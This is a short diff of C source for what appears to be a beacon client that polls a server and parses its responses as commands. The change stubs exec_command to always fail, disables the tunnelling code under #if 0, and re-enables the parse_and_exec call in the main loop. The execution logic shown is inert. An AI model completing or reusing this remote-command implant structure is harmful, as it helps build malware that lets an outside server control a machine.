@@ -608,11 +608,12 @@ char *get_beacon_resp(SOCKET_T sockfd)
 
 /********************* Exec commands ********************/
 
-#if 0
-static int exec_command(char *cmd, char *param);
-
 #define EXEC_SUCCESS 1
 #define EXEC_FAIL (-1)
+
+static int exec_command(char *cmd, char *param) {
+	return EXEC_FAIL;
+}
 
 static void parse_and_exec(char *beacon_response)
 {
@@ -663,6 +664,7 @@ static void parse_and_exec(char *beacon_response)
 /*                 Executing the commands                 */
 /**********************************************************/
 
+#if 0
 #define MAX_ATTR_LEN 128
 
 struct process tcp_tunnel = { 0 };
@@ -963,7 +965,7 @@ int main(int argc, char *argv[])
 			if (response) {
 				printf("[*] Server response:\n%s\n", response);
 				printf(BLUE("[*] Preparing execution...\n"));
-				//parse_and_exec(response);
+				parse_and_exec(response);
 				free(response);
 				printf(BLUE("[*] Resuming main loop\n"));
 				SLEEP(timeout);
